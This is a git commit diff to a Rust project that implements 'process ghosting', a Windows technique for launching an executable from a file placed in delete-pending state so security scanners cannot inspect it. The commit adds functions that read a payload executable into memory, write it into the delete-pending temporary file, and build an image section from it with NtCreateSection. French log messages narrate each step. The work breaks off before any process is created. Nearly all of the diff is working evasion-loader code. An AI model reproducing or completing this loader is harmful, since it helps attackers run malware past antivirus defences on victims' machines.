c2434bedff9ac2f68a3b9d1f8acf33cddbde27d3
eiden-be <adrenbe@protonmail.com>
2025-05-22 22:40:06 +0200

    Avancée du projet

--- process_ghosting/src/main.rs
+++ process_ghosting/src/main.rs
@@ -3,37 +3,29 @@
 use std::{
     env,
     fs,
-    io,
-    mem::{self, size_of, zeroed},
+    mem::{size_of, zeroed},
     path::Path,
     ptr::null_mut,
-    ffi::CString,
 };
 
 use winapi::{
     shared::{
-        minwindef::{FALSE, LPCVOID, LPVOID, MAX_PATH, TRUE},
+        minwindef::{DWORD, FALSE, LPCVOID, LPVOID},
         ntdef::{
-            InitializeObjectAttributes, HANDLE, NTSTATUS, NT_SUCCESS, NULL, OBJECT_ATTRIBUTES,
-            PUNICODE_STRING, PVOID, UNICODE_STRING,
+            HANDLE, NTSTATUS, NT_SUCCESS, NULL, PVOID,
         },
         ntstatus::{
-            STATUS_INVALID_PARAMETER, STATUS_OBJECTID_NOT_FOUND, STATUS_OBJECT_NAME_NOT_FOUND,
-            STATUS_SUCCESS,
+            STATUS_INVALID_PARAMETER, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_SUCCESS
         },
     },
     um::{
-        errhandlingapi::GetLastError,
-        fileapi::{self, CreateFileA, OPEN_ALWAYS,FILE_DISPOSITION_INFO},
-        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
-        winnt::{
-            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE,
-            FILE_SHARE_READ, FILE_SHARE_WRITE, SYNCHRONIZE,
-        },
+        errhandlingapi::GetLastError, fileapi::{CreateFileA, GetFileSize, WriteFile, FILE_DISPOSITION_INFO, OPEN_ALWAYS, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ}, winbase::CreateFileMappingA, winnt::{
+            DELETE, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SEC_IMAGE, SYNCHRONIZE
+        }
     },
 };
 
-use ntapi::ntioapi::{NtSetInformationFile, FileDispositionInformation, IO_STATUS_BLOCK};
+use ntapi::{ntioapi::{FileDispositionInformation, NtSetInformationFile, IO_STATUS_BLOCK}, ntmmapi::NtCreateSection};
 
 
 #[derive(Debug)]
@@ -45,6 +37,123 @@ impl From<NTSTATUS> for Error {
     fn from(status: NTSTATUS) -> Self {
         Self { status }
     }
+}
+
+unsafe fn read_payload(payload:&str) ->Option<(PVOID,u32)>{
+    let h_file = unsafe{ CreateFileA(
+        payload.as_ptr() as *const _,
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        null_mut(),
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        null_mut(),
+    )};
+    if h_file == INVALID_HANDLE_VALUE {
+        println!("[!] CreateFileA Failed: {}", unsafe{GetLastError()});
+        return None;
+    }
+    println!("[+] Ouverture du payload en lecture Ok");
+    
+    let h_map = unsafe { CreateFileMappingA(
+        h_file,
+        null_mut(), 
+        PAGE_READONLY,
+        0, 
+        0, 
+        null_mut())
+    };
+    if h_map == INVALID_HANDLE_VALUE {
+        println!("[!] CreateFileMappingA Failed: {}", unsafe{GetLastError()});
+        unsafe{CloseHandle(h_file)};
+        return None;
+    }
+    println!("[+] CreateFileMappingA Ok");
+
+    let mapped_addr = unsafe { MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0) };
+    if mapped_addr == NULL {
+        println!("[!] MapViewOfFile Failed: {}", unsafe{GetLastError()});
+        unsafe { 
+            CloseHandle(h_map);
+            CloseHandle(h_file);
+        };
+        return None;
+    }
+    println!("[+] MapViewOfFile Ok");
+
+    let file_size = unsafe { GetFileSize(h_file, null_mut()) };
+    let payload_raw = unsafe { VirtualAlloc(
+        NULL,
+        file_size as usize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    ) };
+    if payload_raw == NULL {
+        println!("[!] VirtualAlloc Failed: {}",  unsafe{GetLastError()});
+        unsafe { 
+            UnmapViewOfFile(mapped_addr);
+            CloseHandle(h_map);
+            CloseHandle(h_file);
+    };
+        return None;
+    }
+    println!("[+] On a lu le payload, taille: 0x{:x}", file_size);
+
+    unsafe { std::ptr::copy_nonoverlapping(
+        mapped_addr as *const u8,
+        payload_raw as *mut u8,
+        file_size as usize,
+        ) 
+    };
+    println!("[+] Payload copié !");
+
+    unsafe { 
+        UnmapViewOfFile(mapped_addr);
+        CloseHandle(h_map);
+        CloseHandle(h_file);
+    };
+    Some((payload_raw,file_size))
+
+}
+
+unsafe fn write_payload(h_file:&HANDLE,payload_bytes:LPVOID,payload_size:u32) -> Option<PVOID>{
+    let mut b_written: DWORD = 0;
+    let ok = unsafe { WriteFile(
+        *h_file,
+        payload_bytes as LPCVOID,
+        payload_size,
+        &mut b_written,
+        null_mut(),
+    ) };
+    if ok == FALSE {
+        println!("[!] J'ai pas su écrire le payload dans le fichier temporaire (0x{:X})", unsafe { GetLastError() });
+        return None;
+    }
+    let mut h_section: HANDLE = null_mut();
+    let status = unsafe { NtCreateSection(
+        &mut h_section,
+        SECTION_ALL_ACCESS,
+        null_mut(),
+        null_mut(),            // toute la taille du fichier
+        PAGE_READONLY,
+        SEC_IMAGE,
+        *h_file,
+    ) };
+    if !NT_SUCCESS(status) {
+        eprintln!("[!] NtCreateSection() failed! (0x{:X})", status as u32);
+        return None;
+    }
+    if h_section.is_null() || h_section == INVALID_HANDLE_VALUE {
+        eprintln!(
+            "[!] Le handle retourné par NtCreateSection() est invalide (0x{:X})",
+            status as u32
+        );
+        return None;
+    }
+
+    println!("[+] J'ai mon objet section");
+    // On retourne le handle de section comme pointeur
+    Some(h_section as LPVOID)
 }
 
 unsafe fn prepare_target(cible:&str) -> Option<PVOID>{
@@ -81,26 +190,37 @@ unsafe fn prepare_target(cible:&str) -> Option<PVOID>{
         unsafe{CloseHandle(h_file)};
         return None;
     }
+    println!("[+] Le fichier a été mis en DELETE-PENDING");
     return Some(h_file as PVOID);
 
 }
 
-unsafe fn process_ghosting(cible:&str,fake:&str) -> Result<(), Error>{
+unsafe fn process_ghosting(t_file:&str,payload:&str) -> Result<(), Error>{
        
-    println!("[+] Le fichier que l'on prend est : {cible}");
-    println!("[+] Le fichier temporaire est : {fake}");
+    println!("[+] Le fichier temporaire : {t_file}");
+    println!("[+] Le payload : {payload}");
     
-   if let Err(e) = fs::metadata(cible) {
+    if let Err(e) = fs::metadata(payload) {
         println!("[!] Erreur d'accès au fichier cible : {}", e);
         return Err(Error::from(STATUS_OBJECT_NAME_NOT_FOUND)); 
     }
-    
-    let h_file = match unsafe{prepare_target(cible)} {
+    //On prépare la cible (ouverture du fichier temporaire en delete pending)
+    let h_file = match unsafe{prepare_target(t_file)} {
         Some(handle) => handle,
         None => return Err(Error::from(STATUS_INVALID_PARAMETER)),
     };
-
     println!("[+] Handle de fichier obtenu: {:?}", h_file);
+
+    //On lit le vrai exe pour le mettre en mémoire
+    let (payload_bytes,payload_size) = unsafe { read_payload(payload).ok_or_else(|| Error {status:STATUS_INVALID_PARAMETER}) }?;
+    println!("[+] On a le payload a écrire dans le fichier temporaire");
+    
+    //On va écrire le payload dans le fichier temporaire
+    let section = match unsafe {write_payload(&h_file, payload_bytes, payload_size)} {
+        Some(handle) => handle,
+        None => return Err(Error::from(STATUS_INVALID_PARAMETER))
+    };
+
     Ok(())
 }
 
@@ -115,11 +235,11 @@ fn main() {
         println!("Usage: {} <target> <temp>", procname);
         std::process::exit(1);
     }
-    let cible = &args[1];
-    let fake = &args[2];
+    let t_file = &args[1];
+    let payload = &args[2];
 
     unsafe {
-        match process_ghosting(cible, fake) {
+        match process_ghosting(t_file, payload) {
             Ok(()) => println!("[+] Le process ghosting a fonctionné !"),
             Err(err) => println!("[!] Error: 0x{:x}", err.status),
         }
